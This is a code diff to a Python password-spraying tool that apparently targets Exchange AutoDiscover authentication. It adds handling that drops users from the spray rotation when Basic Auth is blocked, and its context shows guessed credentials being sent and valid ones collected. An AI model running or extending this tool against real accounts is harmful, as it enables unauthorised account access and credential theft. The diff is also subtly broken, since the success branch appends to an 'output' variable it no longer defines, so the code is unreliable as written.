@@ -203,17 +203,27 @@ class Sprayer:
             rsp  = self.method(self.url, headers=self.headers, auth=auth, timeout=30, proxies=self.proxy, verify=False)
 
             status = rsp.status_code
-            output = "[%s%s%s] %s:%s"
 
             if status in self.codes.keys():
-                if status != 200: output += " - Manually confirm (2FA, Locked, etc.)"
-                print(output % (text_colors.green, self.codes[status], text_colors.reset, user, password))
+                if status != 200: output += " (Manually confirm [2FA, Locked, etc.])"
+                print("[%s%s%s] %s:%s" % (text_colors.green, self.codes[status], text_colors.reset, user, password))
                 self.valid_creds[user] = password
 
             else:
-                output += " >>> Invalid user/password"
-                if status not in [401, 404]: output += " or unknown error [%s]" % status
-                print(output % (text_colors.red, "INVALID", text_colors.reset, user, password))
+                output = "[%s%s%s] %s:%s" % (text_colors.red, "INVALID", text_colors.reset, user, password)
+
+                if status not in [401, 404]:
+                    output += " (Unknown Error [%s])" % status
+
+                # TODO: Handle other AutoDiscovery error messages
+                if "X-AutoDiscovery-Error" in rsp.headers:
+                    # Handle Basic Auth blocking - remove user from future rotations
+                    if any(_str in rsp.headers.get("X-AutoDiscovery-Error") for _str in ["Basic Auth Blocked", "BasicAuthBlocked"]):
+                        output = "[%s%s%s] %s:" % (text_colors.red, "BLOCKED", text_colors.reset, user)
+                        output += " Basic Auth blocked for this user. Removing from spray rotation."
+                        self.user_list.remove(user)
+
+                print(output)
 
         except Exception as e:
             if self.debug: print("[ERROR] %s" % e)
@@ -256,7 +266,7 @@ if __name__ == "__main__":
 
     # If password spraying make sure we have username(s) and password(s)
     if args.spray and ((not args.username and not args.usernames) or (not args.password and not args.passwords)):
-        parser.error("[-u/--username or -U/--usernames] and [-p/--password or -P/--passwords] are required" + 
+        parser.error("[-u/--username or -U/--usernames] and [-p/--password or -P/--passwords] are required" +
             " when performing password spraying via -s/--spray.")
 
     start  = time.time()
